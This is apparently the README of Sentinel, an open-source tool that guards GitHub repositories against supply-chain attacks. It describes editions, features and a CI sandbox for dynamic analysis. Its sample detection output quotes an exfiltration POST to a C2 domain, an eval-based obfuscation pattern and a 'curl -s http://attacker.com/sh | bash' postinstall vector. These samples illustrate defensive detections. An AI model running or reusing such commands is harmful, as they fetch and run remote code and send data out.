# Sentinel: Local Security Guardian for GitHub Repositories
> **Proactive Supply-Chain Evasion Detection & Zero-Trust Behavioral Guard for the Modern Developer.**


**[Official Site](https://javier20dev25.github.io/Sentinel/) | [User Guide](docs/USER_GUIDE.md) | [CLI Reference](docs/CLI_REFERENCE.md) | [🤖 AI Agent Guide](docs/AI_AGENT_GUIDE.md) | [Sandbox Guide](docs/SANDBOX_GUIDE.md) | [Architecture](docs/ARCHITECTURE.md) | [Policies](docs/POLICIES.md) | [Changelog](CHANGELOG.md) | [💙 Acknowledgements](ACKNOWLEDGEMENTS.md)**

[![GitHub Sponsors](https://img.shields.io/badge/Sponsor-💙_Support_Sentinel-EA4AAA?style=flat-square&logo=githubsponsors)](https://github.com/sponsors/javier20dev25)
[![Ko-fi](https://img.shields.io/badge/Ko--fi-Support_via_Ko--fi-FF5E5B?style=flat-square&logo=kofi)](https://ko-fi.com/sentinel_security)
[![Buy Me a Coffee](https://img.shields.io/badge/Buy_Me_a_Coffee-☕_Donate-FFDD00?style=flat-square&logo=buymeacoffee&logoColor=black)](https://buymeacoffee.com/sentinelsecurity)


## 🇪🇸 Resumen Ejecutivo (Spanish)
Sentinel 3.0 integra una infraestructura de **Sandbox Dinámico** basada en GitHub Actions para el análisis de comportamiento en tiempo de ejecución. Esta funcionalidad permite identificar amenazas que evaden el análisis estático.

### 🧪 Capacidades del CI Sandbox (Análisis Dinámico)
A diferencia de otras herramientas que se limitan al análisis de código estático, Sentinel ofrece una forma segura de analizar el *comportamiento* real de tus dependencias:
*   **Ejecución Aislada**: Utiliza GitHub Actions como un contenedor seguro y efímero para simular procesos de instalación y construcción (`npm install`, `npm build`).
*   **Telemetría de Comportamiento**: Monitorea el entorno en busca de indicadores de alto riesgo:
    *   **Red (Network Guard)**: Detecta conexiones no autorizadas a dominios de Comando y Control (C2).
    *   **Detección de WASM**: Identifica binarios WebAssembly ocultos usados para camuflar malware.
    *   **Integridad del Lockfile**: Alerta sobre el "Envenenamiento de Lockfiles" donde se redirigen dependencias a registros comprometidos.
    *   **Hooks de Instalación**: Escudriña scripts `preinstall` y `postinstall` en busca de accesos sospechosos al sistema.
*   **Puntuación de Riesgo**: Combina los resultados estáticos de AST con la telemetría dinámica para generar un **Sentinel Risk Score (1-10)** unificado.

---


---

Sentinel is a high-performance, local security monitoring and auditing suite designed to protect your GitHub repositories from vulnerabilities, secrets leakage, and unauthorized changes. It functions as a **Supply-Chain Firewall**, combining an Electron-based desktop application with a robust Node.js backend and a versatile CLI to ensure that no malicious code enters your production environment.


---

## Vision

Sentinel acts as a persistent "Overwatch" for your development environment, scanning PRs, commits, and local configurations in real-time, all while keeping your security data entirely under your control.

---

## Important Note: Ongoing Development

Sentinel is a work in progress developed by a single person. While the core security engine is robust, certain features in the CLI, Desktop App, and Web interfaces are still being refined. We are actively working on resolving bugs and expanding functionality.

---

## Available Versions and Deployment Guides

Sentinel is distributed in three formats. Choose the one that best fits your workflow.

### 1. Windows Installer (Standard Edition)
The most convenient option for Windows users who want a traditional desktop experience.
* **Format**: .exe installer.
* **Guide**: Download `Sentinel Setup.exe` from the latest release, run the installer, and follow the steps. 
* **Note**: If Windows SmartScreen displays a warning, click "More info" and "Run anyway".

### 2. Portable Version (Zero Installation)
Ideal for portable environments or systems where installation is restricted.
* **Format**: .zip package.
* **Guide**: Download `Sentinel-win32-x64.zip`, extract to any directory, and execute `Sentinel.exe`.

### 3. Sentinel Local Web Edition (Recommended / Most Powerful)
This is the ultimate version of Sentinel. It runs directly from the source code and provides the most comprehensive security features, including advanced hardening and local server management.
* **Format**: Source code via NPM.
* **Exclusive Features**:
    * **Sentinel Project Shield (SPS)**: In-place environment hardening and deep AST static analysis for dependency safety.
    * **Asset Guard (SAG)**: Proactive Git push interception for prohibited files (keys, .env) with master password override.
    * **Global Audit Trail (SGA)**: Full immutable event logging with direct Git commit traceability to GitHub.
    * **Server Process Management**: Remote shutdown and real-time backend monitoring.

**How to run the Local Web Edition:**
```bash
git clone https://github.com/javier20dev25/Sentinel.git
cd Sentinel/src/ui
npm install
npm run sentinel
```
*(Note: Using Node.js 20/22 LTS is required for optimal performance and compatibility).*

---

## Key Features

* **Interactive Security Dashboard**: Manage all your linked repositories and security status from a sleek, professional interface.
* **Intelligence Categorization**: Advanced threat classification (Static/Dynamic) and granular subcategories for precise risk assessment.
* **Sentinel Smart Webhooks**: Near-instant GitHub event ingestion for real-time protection without aggressive polling.
* **Built-in CLI**: Run security audits, manage links, and trigger scans directly from your terminal.
* **Hardened Command Execution**: Uses strict whitelisting and direct argument arrays to prevent shell injection (CWE-78).
* **GitHub Auth Integration**: Secure OAuth flow via the official GitHub CLI for repository access.

---

## 🧪 Real-World Detection Output (Showcase)

When Sentinel identifies a threat, it generates a high-fidelity report. Here is a sample output of a detected "Supply-Chain Injection" during an `npm install` cycle:

| Threat Category | Evidence (Detection Vector) | Risk Score | Recommended Action |
| :--- | :--- | :--- | :--- |
| **🚨 Network Evasion** | `POST -> https://c2-malware-server.ru/exfil` | **9.8/10** | Immediate Revocation of NPM Tokens |
| **🛡️ AST Mutation** | `eval(String.fromCharCode(...))` in `lib/index.js` | **8.5/10** | Quarantining Dependency |
| **📦 Lockfile Poisoning** | Registry mismatch in `package-lock.json` | **7.2/10** | Re-generating Lockfile from Main |

### Sample Sentinel Audit Log (JSON)
```json
{
  "timestamp": "2026-04-14T18:56:00Z",
  "repository": "user/enterprise-app",
  "alerts": [
    {
      "type": "MALICIOUS_POSTINSTALL",
      "severity": "CRITICAL",
      "vector": "ChildProcess: curl -s http://attacker.com/sh | bash",
      "sandboxed": true,
      "mitigated": "PROCESS_TERMINATED"
    }
  ],
  "engine_ver": "3.6.1-PRO"
}
```


---

## Sentinel CI Sandbox: Dynamic Runtime Analysis

Sentinel 3.0 introduces a state-of-the-art **Hybrid Analysis** engine. While most tools stop at static code scanning, Sentinel provides a secure way to analyze the *behavior* of your code and dependencies:

*   **Isolated Execution**: Leverages GitHub Actions as a secure, ephemeral container to simulate installation and build processes (`npm install`, `npm build`).
*   **Behavioral Telemetry**: Monitors the sandbox environment for high-risk indicators:
    *   **Network Guard**: Detects unauthorized connections to Command & Control (C2) domains during installation.
    *   **WASM Detection**: Identifies hidden WebAssembly binaries often used to obfuscate malicious payloads.
    *   **Lockfile Integrity**: Alerts on "Lockfile Poisoning" where dependencies are silently redirected to compromised registries.
    *   **Post-Install Hook Monitoring**: Scrutinizes `preinstall` and `postinstall` scripts for suspicious system-level access.
*   **Risk Scoring**: Combines static AST results with dynamic behavioral telemetry to provide a unified **Sentinel Risk Score (1-10)**.

---

## Technical Stack

* **Frontend**: React.js + Vite + Framer Motion (Premium UI)
* **Desktop Wrapper**: Electron
* **Backend**: Express.js (Hardened Security API)
* **Database**: SQLite (via better-sqlite3)
* **Git Engine**: Direct Git & GitHub CLI integration

---

## Security Principles

Sentinel follows a "Local-First, Zero-Trust" approach:
* **Zero Shell Interaction**: All system commands are executed via execFileSync with static argument arrays.
* **In-Memory Sanitization**: All security logs are sanitized before storage or display.
* **Data Sovereignty**: No scanning data ever leaves your machine; everything stays securely in your local SQLite database.

---

## Contributing & Governance

Sentinel is a solo-developer project that thrives on high-quality community feedback and professional collaborations.

**How to contribute:**
1. Clone the repository using the Local Web Edition guide.
2. Review the [Architecture Guide](docs/ARCHITECTURE.md), [Testing Guide](docs/TESTING_GUIDE.md), and [Official Policies](docs/POLICIES.md).
3. Ensure all tests pass before submitting a PR: `npm test`.
4. Submit a Pull Request. We actively accept improvements focusing on security, performance, and UI aesthetics.

**Code of Conduct**: All participants are expected to follow our [Code of Conduct](CODE_OF_CONDUCT.md).
**Security Reports**: Use [GitHub Security Advisories](https://github.com/javier20dev25/Sentinel/security/advisories/new) to report vulnerabilities privately.
**License**: This project is licensed under the [MIT License](LICENSE).

---

*Sentinel: Because your code deserves an uncompromising guardian.*
